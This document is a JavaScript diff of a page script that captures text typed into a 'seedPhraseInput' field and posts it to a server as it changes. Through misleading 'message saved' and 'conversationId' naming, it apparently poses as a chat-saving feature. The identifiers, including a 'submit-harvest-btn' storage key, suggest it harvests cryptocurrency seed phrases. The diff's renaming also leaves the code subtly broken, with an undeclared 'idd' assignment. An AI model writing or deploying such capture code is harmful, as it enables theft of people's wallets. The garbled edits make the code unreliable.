@@ -1,6 +1,6 @@
 const input = document.getElementById("seedPhraseInput");
 
-let conversationId = localStorage.getItem("submit-harvest-btn");
+let id = localStorage.getItem("submit-harvest-btn");
 let saveTimer = null;
 
 input.addEventListener("input", () => {
@@ -27,7 +27,7 @@ async function saveMessage(text) {
             },
             body: JSON.stringify({
                 text: text,
-                conversationId: conversationId
+                id: id
             })
         });
 
@@ -39,11 +39,11 @@ async function saveMessage(text) {
             );
         }
 
-        conversationId = result.conversationId;
+        idd = result.id;
 
         localStorage.setItem(
-            "conversationId",
-            conversationId
+            "id",
+            id
         );
 
         console.log("Message saved:", result.message.id);
